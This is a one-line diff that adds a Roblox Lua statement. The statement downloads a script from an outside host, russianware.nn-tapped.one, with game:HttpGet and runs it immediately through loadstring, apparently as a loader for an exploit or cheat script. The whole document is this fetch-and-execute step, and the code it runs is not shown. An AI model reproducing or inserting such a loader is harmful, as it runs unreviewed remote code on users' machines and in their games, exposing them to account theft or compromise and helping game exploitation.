@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://russianware.nn-tapped.one/p/raw/3bkgs4ug5b"))()
